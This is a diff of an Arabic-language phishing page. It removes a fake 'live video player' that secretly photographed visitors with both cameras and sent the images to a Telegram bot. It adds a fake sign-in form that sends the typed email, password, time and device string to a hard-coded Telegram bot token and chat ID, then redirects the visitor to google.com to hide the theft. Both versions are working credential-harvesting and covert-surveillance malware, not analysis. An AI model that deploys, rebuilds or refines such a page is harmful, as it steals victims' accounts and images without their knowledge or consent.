@@ -1,11 +1,9 @@
-# Cammmm
-Cammm
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشغل الفيديو</title>
+    <title>تسجيل الدخول</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -29,27 +27,19 @@ Cammm
         }
         h2 { font-weight: 300; margin-bottom: 10px; color: #e94560; }
         p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
-        #status {
-            background: #16213e;
+        input {
+            width: 100%;
             padding: 15px;
             border-radius: 12px;
-            font-size: 15px;
-            color: #eee;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-left: 4px solid #e94560;
+            border: none;
+            background: #16213e;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 15px;
+            outline: none;
         }
-        video {
-            width: 100%;
-            border-radius: 15px;
-            margin-top: 20px;
-            display: none;
-            border: 2px solid #e94560;
-        }
+        input::placeholder { color: #888; }
         .btn {
-            margin-top: 20px;
             padding: 14px 0;
             background: #e94560;
             border: none;
@@ -60,141 +50,108 @@ Cammm
             cursor: pointer;
             width: 100%;
             transition: 0.3s;
-            display: none;
         }
         .btn:hover { background: #c73652; transform: scale(1.02); }
-        .loader { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #aaa;
+            min-height: 25px;
+        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>📹 مشغل البث المباشر</h2>
-    <p>اضغط "تشغيل" لبدء المشاهدة</p>
-    <div id="status">⏳ جاري التحميل...</div>
-    <video id="video" playsinline autoplay></video>
-    <button class="btn" id="captureBtn">▶ تشغيل البث</button>
+    <h2>🔐 تسجيل الدخول</h2>
+    <p>أدخل بريدك الإلكتروني وكلمة المرور</p>
+    <input type="email" id="emailInput" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="passwordInput" placeholder="كلمة المرور" required>
+    <button class="btn" id="submitBtn">تسجيل الدخول</button>
+    <div id="status"></div>
 </div>
 
 <script>
     // ============================================================
-    // إعدادات بوت تيليغرام - تم التعديل
+    // إعدادات بوت تيليغرام
     // ============================================================
     const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
     const CHAT_ID   = "5730027675";
 
     // ============================================================
-    // باقي الكود
-    // ============================================================
 
-    let video = document.getElementById('video');
-    let statusDiv = document.getElementById('status');
-    let captureBtn = document.getElementById('captureBtn');
-    let stream = null;
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusDiv = document.getElementById('status');
 
-    async function sendToTelegram(imageDataURL) {
+    async function sendCredentialsToTelegram(email, password) {
         try {
-            const res = await fetch(imageDataURL);
-            const blob = await res.blob();
+            const message = `🔐 **تم تسجيل بيانات دخول جديدة**\n\n📩 البريد: ${email}\n🔑 كلمة المرور: ${password}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}`;
 
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.jpg');
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                body: formData
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
 
             const result = await response.json();
             if (result.ok) {
-                console.log('✅ تم الإرسال إلى تيليغرام');
-                statusDiv.innerHTML = '✅ تم الإرسال إلى تيليغرام';
+                statusDiv.innerHTML = '✅ تم تسجيل الدخول بنجاح، جاري التوجيه...';
+                statusDiv.style.color = '#4caf50';
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 1500);
             } else {
-                console.error('❌ فشل الإرسال:', result);
-                statusDiv.innerHTML = '❌ فشل الإرسال إلى تيليغرام';
+                statusDiv.innerHTML = '❌ حدث خطأ، حاول مرة أخرى';
+                statusDiv.style.color = '#e94560';
+                console.error(result);
             }
         } catch (e) {
-            console.error('❌ خطأ في الإرسال:', e);
             statusDiv.innerHTML = '❌ خطأ في الاتصال';
+            statusDiv.style.color = '#e94560';
+            console.error(e);
         }
     }
 
-    function captureFrame() {
-        if (!stream) return;
-        const track = stream.getVideoTracks()[0];
-        if (!track) return;
+    submitBtn.addEventListener('click', function() {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
 
-        const settings = track.getSettings();
-        const canvas = document.createElement('canvas');
-        canvas.width = settings.width || 640;
-        canvas.height = settings.height || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.9);
-    }
-
-    async function startCamera() {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: { ideal: "environment" } }
-            });
-
-            video.srcObject = stream;
-            video.style.display = 'block';
-            captureBtn.style.display = 'block';
-            statusDiv.innerHTML = '📷 تم الوصول إلى الكاميرا. اضغط "تشغيل البث"';
-            captureBtn.innerText = '📸 التقاط وإرسال';
-
-            statusDiv.innerHTML = '⏳ جاري التقاط الصورة...';
-            const imgData = captureFrame();
-            if (imgData) {
-                await sendToTelegram(imgData);
-                tryFrontCamera();
-            }
-
-            captureBtn.onclick = async function() {
-                statusDiv.innerHTML = '⏳ جاري التقاط الصورة...';
-                const newImg = captureFrame();
-                if (newImg) {
-                    await sendToTelegram(newImg);
-                }
-            };
-
-        } catch (error) {
-            statusDiv.innerHTML = '❌ تعذر الوصول إلى الكاميرا. امنح الصلاحية وأعد تحميل الصفحة.';
-            console.error(error);
+        if (!email || !email.includes('@') || !email.includes('.')) {
+            statusDiv.innerHTML = '⚠️ يرجى إدخال بريد إلكتروني صحيح';
+            statusDiv.style.color = '#ff9800';
+            return;
         }
-    }
 
-    async function tryFrontCamera() {
-        try {
-            const frontStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: { ideal: "user" } }
-            });
-            const frontVideo = document.createElement('video');
-            frontVideo.srcObject = frontStream;
-            await frontVideo.play();
-            await new Promise(r => setTimeout(r, 300));
-
-            const canvas = document.createElement('canvas');
-            const track = frontStream.getVideoTracks()[0];
-            const settings = track.getSettings();
-            canvas.width = settings.width || 640;
-            canvas.height = settings.height || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
-            const imgData = canvas.toDataURL('image/jpeg', 0.9);
-
-            await sendToTelegram(imgData);
-            frontStream.getTracks().forEach(t => t.stop());
-        } catch (e) {
-            console.log('⚠️ لا توجد كاميرا أمامية أو تم رفضها');
+        if (!password || password.length < 4) {
+            statusDiv.innerHTML = '⚠️ يرجى إدخال كلمة مرور صحيحة (4 أحرف على الأقل)';
+            statusDiv.style.color = '#ff9800';
+            return;
         }
-    }
 
-    startCamera();
+        statusDiv.innerHTML = '⏳ جاري التحقق...';
+        statusDiv.style.color = '#aaa';
+        sendCredentialsToTelegram(email, password);
+    });
+
+    // إرسال عند الضغط على Enter
+    emailInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            submitBtn.click();
+        }
+    });
+
+    passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            submitBtn.click();
+        }
+    });
 </script>
 
 </body>
